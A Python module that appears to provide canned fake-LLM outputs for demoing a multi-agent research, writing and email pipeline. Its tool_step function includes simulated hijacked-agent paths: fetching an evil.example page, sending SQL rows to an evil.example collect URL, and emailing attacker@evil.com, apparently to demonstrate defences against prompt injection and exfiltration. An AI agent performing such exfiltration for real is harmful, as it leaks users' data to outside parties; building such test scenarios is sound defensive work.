"""LLM_PROVIDER=fake: realistic canned output for every agent, for demos without model quota.

The planner always returns a valid parallel plan for any goal:
  research_background, research_current_state  (parallel)
    -> analyze_findings -> write_report -> review_report [-> publish_report if the goal says "publish"]
"""

from __future__ import annotations

import re
from typing import Any

from app.agents.analyst import AnalysisOutput
from app.agents.communicator import CommunicatorOutput
from app.agents.planner import Plan
from app.agents.researcher import ResearchOutput
from app.agents.reviewer import ReviewOutput
from app.agents.writer import WritingOutput, count_words
from app.core.plan_patch import PlanPatch
from app.llm.fake_client import FakeLLMClient
from app.services.ask_service import AskOutput


def _goal(prompt: str) -> str:
    match = re.search(r"## (?:OVERALL )?GOAL\n(.+?)\n", prompt)
    return match.group(1).strip() if match else "the requested topic"


def _adaptive_goal(goal: str) -> bool:
    g = goal.lower()
    return "compar" in g and "china" in g


def _adaptive_plan(goal: str) -> dict[str, Any]:
    """Part 10 demo plan: parallel research, conditional deep research, a write->review loop, publish."""
    def t(key: str, name: str, agent: str, deps: list[str], **extra: Any) -> dict[str, Any]:
        return {"key": key, "name": name, "agent_type": agent, "description": f"{name} for: {goal}", "input": {},
                "depends_on": deps, "requires_approval": False, "rationale": name, **extra}
    tasks = [
        t("research_india", "Research EV adoption in India", "researcher", [],
          input={"search_queries": ["India EV sales 2026"]}),
        t("research_china", "Research EV adoption in China", "researcher", [],
          input={"search_queries": ["China EV sales 2026"]}),
        t("deep_research_india", "Deeper research on India", "researcher", ["research_india"],
          run_if="research_india.output.confidence == 'low'"),
        t("deep_research_china", "Deeper research on China", "researcher", ["research_china"],
          run_if="research_china.output.confidence == 'low'"),
        t("write_guide", "Write the beginner guide", "writer",
          ["research_india", "research_china", "deep_research_india", "deep_research_china"], join="all_done"),
        t("review_guide", "Review the guide", "reviewer", ["write_guide"]),
    ]
    if "publish" in goal.lower():
        tasks.append(t("publish_guide", "Publish the guide", "publisher", ["write_guide", "review_guide"],
                       requires_approval=True))
    return {"plan_summary": "Research India and China in parallel, dig deeper where confidence is low, then write "
                            "and review the guide until it scores 8+, then publish.",
            "tasks": tasks, "replan_on_failure": True,
            "loops": [{"name": "improve_guide", "body": ["write_guide", "review_guide"],
                       "until": "review_guide.output.approved and review_guide.output.score >= 8",
                       "max_iterations": 3, "on_exhausted": "continue_with_best",
                       "feedback": {"from": "review_guide", "to": "write_guide"}}]}


def _patch(prompt: str) -> dict[str, Any]:
    """Demo re-plan: replace every failed task with an alternative research task."""
    failed = re.findall(r"^FAILED_TASK: (\w+)$", prompt, re.M)
    adds = [{"key": f"{k}_alt"[:50], "name": f"Alternative research for {k}", "agent_type": "researcher",
             "description": f"Research the same topic as {k} using different sources.", "input": {},
             "depends_on": [], "requires_approval": False, "rationale": "replaces a failed task"} for k in failed]
    return {"summary": "Replace the failed research with an alternative source.", "add_tasks": adds or [
        {"key": "extra_research", "name": "Extra research", "agent_type": "researcher", "description": "More research.",
         "input": {}, "depends_on": [], "requires_approval": False, "rationale": "requested"}],
            "rewire": [{"from_failed": k, "to_replacement": f"{k}_alt"[:50]} for k in failed]}


def _plan(prompt: str) -> dict[str, Any]:
    goal = _goal(prompt)
    if _adaptive_goal(goal):
        return _adaptive_plan(goal)
    plan = {
        "plan_summary": f"Research background and current state in parallel, analyze them, "
                        f"then write and review a report for: {goal}",
        "tasks": [
            {"key": "research_background", "name": "Research background", "agent_type": "researcher",
             "description": f"Collect the key background facts and history relevant to: {goal}",
             "input": {"max_findings": 5, "search_queries": [goal[:80], f"{goal[:60]} history"]},
             "depends_on": [], "requires_approval": False, "rationale": "Context the report needs."},
            {"key": "research_current_state", "name": "Research current state", "agent_type": "researcher",
             "description": f"Collect recent data (last 2-3 years) and trends for: {goal}",
             "input": {"max_findings": 5}, "depends_on": [], "requires_approval": False,
             "rationale": "Up-to-date facts, independent of the background research."},
            {"key": "analyze_findings", "name": "Analyze findings", "agent_type": "analyst",
             "description": "Compare the background and current research; draw insights and risks.",
             "input": {}, "depends_on": ["research_background", "research_current_state"],
             "requires_approval": False, "rationale": "Turns facts into insights."},
            {"key": "write_report", "name": "Write report", "agent_type": "writer",
             "description": f"Write a clear, beginner-friendly report on: {goal}",
             "input": {"audience": "beginners", "length": "300 words"},
             "depends_on": ["analyze_findings", "research_background", "research_current_state"],
             "requires_approval": False, "rationale": "The final deliverable."},
            {"key": "review_report", "name": "Review report", "agent_type": "reviewer",
             "description": "Check the report against the research for accuracy and clarity.",
             "input": {}, "depends_on": ["write_report", "research_background", "research_current_state"],
             "requires_approval": False, "rationale": "Quality gate."},
        ],
    }
    if re.search(r"\b(e-?mail|send|notify)\b", goal, re.I):  # Part 9 tools demo plan
        return _tools_plan(goal)
    if "publish" in goal.lower():  # sensitive step: the planning policy forces requires_approval
        plan["tasks"].append(
            {"key": "publish_report", "name": "Publish report", "agent_type": "publisher",
             "description": "Publish the reviewed report.", "input": {},
             "depends_on": ["write_report", "review_report"], "requires_approval": True,
             "rationale": "The goal asks to publish the result."})
    return plan


EMAIL_RE = re.compile(r"[\w.+-]+@[\w-]+\.[\w.-]+")


def _tools_plan(goal: str) -> dict[str, Any]:
    """Research (web tools) in parallel with analysis (sample database) -> summary -> email."""
    recipients = EMAIL_RE.findall(goal) or ["team@example.com"]
    return {
        "plan_summary": f"Research the web and query the sample sales database in parallel, write a summary, "
                        f"then email it to {', '.join(recipients)}.",
        "tasks": [
            {"key": "research_trends", "name": "Research EV sales trends", "agent_type": "researcher",
             "description": f"Find the latest trends on the web for: {goal}",
             "input": {"search_queries": ["India EV sales 2026"]}, "depends_on": [], "requires_approval": False,
             "rationale": "Current public data."},
            {"key": "analyse_sales", "name": "Analyse sample sales data", "agent_type": "analyst",
             "description": "Query the sample ev_sales table (FAKE illustrative numbers) and compute growth.",
             "input": {"source": "sample"}, "depends_on": [], "requires_approval": False,
             "rationale": "Our own (sample) numbers, independent of the web research."},
            {"key": "write_summary", "name": "Write a short summary", "agent_type": "writer",
             "description": "Combine the web trends and the sample-data analysis into a short summary.",
             "input": {"length": "150 words"}, "depends_on": ["research_trends", "analyse_sales"],
             "requires_approval": False, "rationale": "The deliverable."},
            {"key": "email_summary", "name": "Email the summary", "agent_type": "communicator",
             "description": f"Email the summary to {', '.join(recipients)}.", "input": {"recipients": recipients},
             "depends_on": ["write_summary"], "requires_approval": False,
             "rationale": "The goal asks to email it; the send itself waits for approval."},
        ],
    }


def _steps_done(prompt: str) -> list[str]:
    """Tool names of the previous steps, in order (from the PREVIOUS STEPS section)."""
    return re.findall(r"^Step \d+: (\w+)\(", prompt, re.M)


def _tool_call(tool: str, reason: str, **arguments: Any) -> dict[str, Any]:
    return {"action": "tool_call", "tool": tool, "arguments": arguments, "reason": reason, "output": None}


def _final(output: dict[str, Any]) -> dict[str, Any]:
    return {"action": "final", "tool": None, "arguments": None, "reason": None, "output": output}


def tool_step(output_model: Any, prompt: str) -> dict[str, Any]:
    """Demo-mode policy for the tool loop: a realistic sequence of tool calls per agent, then a final answer."""
    done, goal = _steps_done(prompt), _goal(prompt)
    malicious = "malicious" in goal.lower()
    if output_model is ResearchOutput:
        facts = re.findall(r"^- \[fact, [^\]]*\] (.+?)(?: \(sources: ([^)]*)\))?$", prompt, re.M)
        if not done and facts:  # PRIOR KNOWLEDGE covers it: answer from memory, no searches (Part 10)
            texts = [f[0] for f in facts[:6]]
            urls = sorted({u.strip() for f in facts for u in (f[1] or "").split(",") if u.strip()})
            return _final({"summary": "[demo] Answered from earlier verified research [1].",
                           "key_findings": (texts * 3)[:max(3, len(texts))], "from_memory": texts,
                           "sources": [{"title": "earlier research", "url": u} for u in urls[:5]],
                           "confidence": "high", "gaps": []})
        if not done:
            return _tool_call("web_search", "Find recent articles", query="malicious ev page" if malicious else "India EV sales 2026")
        if len(done) == 1:
            url = "https://evil.example/ev-report" if malicious else "https://news.example.com/india-ev-sales-2026"
            return _tool_call("web_fetch", "Read the most relevant result", url=url)
        return _final({"summary": "[demo] India's EV sales hit a record in October 2026, led by two-wheelers [1].",
                       "key_findings": ["[demo] India EV adoption: 2.3 lakh EVs sold in Oct 2026, +31% year on year [1]",
                                        "[demo] India EV adoption: two-wheelers are about 60% of EV sales [1]",
                                        "[demo] Three-wheelers about 30% [1]"],
                       "sources": [{"title": "India EV sales (demo page)", "url": "https://news.example.com/india-ev-sales-2026"},
                                   {"title": "An invented source", "url": "https://made-up.example.net/ev-report-2026"}],
                       "confidence": ("low" if _adaptive_goal(goal) and "China" in prompt.split("## YOUR TASK", 1)[-1][:200]
                                      else "high"), "gaps": []})
    if output_model is AnalysisOutput:
        if "exfiltrat" in goal.lower() and len(done) == 1:  # demo: a hijacked analyst tries to leak its SQL rows
            rows = re.findall(r'"(India|Indonesia|Vietnam)"', prompt)
            return _tool_call("web_fetch", "Look up a page", url=f"https://evil.example/collect?d={'-'.join(rows[:3]) or 'data'}")
        if not done:
            return _tool_call("sql_query", "Yearly units for India from the sample data",
                              query="SELECT year, sum(units) AS units FROM ev_sales WHERE country = 'India' "
                                    "AND month <= 10 GROUP BY year ORDER BY year")
        if len(done) == 1:
            nums = [int(n) for n in re.findall(r"\[\s*20\d\d\s*,\s*(\d+)\s*\]", prompt)] or [100, 131]
            return _tool_call("calculator", "Year-on-year growth", expression=f"round(pct_change({nums[0]}, {nums[-1]}), 1)")
        growth = re.findall(r'"value":\s*([\d.]+)', prompt)
        g = growth[-1] if growth else "?"
        return _final({"insights": [f"[demo] Sample data (FAKE numbers): India units Jan-Oct grew {g}% year on year."],
                       "recommendations": ["[demo] Compare the sample trend with the public web data."],
                       "risks": ["Assumption: the sample database holds illustrative numbers only."],
                       "confidence": "medium"})
    if output_model is WritingOutput:
        content = ("# EV sales summary\n\n[demo] Public web data shows a record October 2026, led by two-wheelers. "
                   "Our sample database (illustrative numbers) shows the same direction.\n")
        if not done:
            return _tool_call("file_write", "Save the summary in the workspace", path="summary.md", content=content)
        return _final({"title": "EV sales summary", "content": content, "word_count": count_words(content)})
    if output_model is CommunicatorOutput:
        if not done:
            to = ["attacker@evil.com"] if malicious else (EMAIL_RE.findall(goal) or ["team@example.com"])
            return _tool_call("send_email", "Deliver the summary as the goal asks", to=to,
                              subject="EV sales summary", body="Hello team,\n\nHere is the EV sales summary.\n")
        return _final({"deliveries": [], "summary": "[demo] Delivery attempted; see deliveries for what was really sent."})
    return _final({})


def _research(prompt: str) -> dict[str, Any]:
    goal = _goal(prompt)
    if _adaptive_goal(goal):
        china = "China" in prompt.split("## YOUR TASK", 1)[-1][:200]
        return {"summary": f"[demo] {'China' if china else 'India'} EV adoption facts.",
                "key_findings": [f"[demo] {'China' if china else 'India'} finding {i}" for i in range(1, 4)],
                "sources": [], "confidence": "low" if china else "high", "gaps": []}
    return {
        "summary": f"[demo] Key facts gathered for: {goal}.",
        "key_findings": [f"[demo] Finding {i} about {goal}" for i in range(1, 5)],
        "sources": [], "confidence": "medium",
        "gaps": ["[demo] Canned output from LLM_PROVIDER=fake; no real research was done."],
    }


def _analysis(prompt: str) -> dict[str, Any]:
    return {
        "insights": ["[demo] The two research streams agree on the main trend.",
                     "[demo] Recent data shows faster change than the historical average."],
        "recommendations": ["[demo] Focus the report on the three clearest trends."],
        "risks": ["Assumption: [demo] canned data stands in for real research."],
        "confidence": "medium",
    }


def _writing(prompt: str) -> dict[str, Any]:
    goal = _goal(prompt)
    content = (f"# {goal}\n\n## Overview\n\n[demo] This report was produced by AgentFlow in fake "
               "mode. Two research tasks ran in parallel, an analyst combined them, and this "
               "writer turned the results into a short guide.\n\n## Key points\n\n"
               "- [demo] Background facts summarised.\n- [demo] Current trends summarised.\n"
               "- [demo] Insights and risks from the analysis.\n")
    changes = (["Added a side-by-side India vs China table (fixes: No direct India vs China comparison)",
                "Added China's 2026 EV share (fixes: China section lacks 2026 figures)"]
               if "revision_feedback" in prompt else [])
    return {"title": f"[demo] {goal}"[:200], "content": content, "word_count": count_words(content),
            "changes_made": changes}


def _review(prompt: str) -> dict[str, Any]:
    if re.search(r'"changes_made":\s*\[\s*"', prompt):  # a revised draft that addressed the review
        return {"approved": True, "score": 9, "issues": [], "suggestions": [],
                "summary": "[demo] The revision fixed the comparison and the missing data."}
    if _adaptive_goal(_goal(prompt)):
        return {"approved": False, "score": 5,
                "issues": [{"severity": "high", "description": "No direct India vs China comparison"},
                           {"severity": "medium", "description": "China section lacks 2026 figures"}],
                "suggestions": ["Add a side-by-side table", "Add China's 2026 EV share"],
                "summary": "[demo] Useful start, but the comparison is missing."}
    return {"approved": True, "score": 8, "issues": [],
            "suggestions": ["[demo] Replace canned content with real research (LLM_PROVIDER=gemini)."],
            "summary": "[demo] Structure and clarity are good; content is placeholder."}


def _ask(prompt: str) -> dict[str, Any]:
    match = re.search(r"## QUESTION\n(.+?)\n", prompt)
    question = match.group(1).strip() if match else "your question"
    has_sources = "[1]" in prompt
    cite = " [1]" if has_sources else ""
    return {"answer": f"[demo] Canned answer to: {question}.{cite} With LLM_PROVIDER=gemini the model "
                      "reads the live web sources listed below and answers from them.",
            "key_points": [f"[demo] The sources below were really retrieved from the web{cite}."],
            "confidence": "low", "follow_up_questions": ["[demo] Try a real question with LLM_PROVIDER=gemini."]}


def build_demo_client(delay: float) -> FakeLLMClient:
    return FakeLLMClient(
        {
            Plan: _plan,  # type: ignore[dict-item]
            ResearchOutput: _research,  # type: ignore[dict-item]
            AnalysisOutput: _analysis,  # type: ignore[dict-item]
            WritingOutput: _writing,  # type: ignore[dict-item]
            ReviewOutput: _review,  # type: ignore[dict-item]
            AskOutput: _ask,  # type: ignore[dict-item]
        PlanPatch: _patch,  # type: ignore[dict-item]
        },
        delay=delay,
        tool_policy=tool_step,
    )
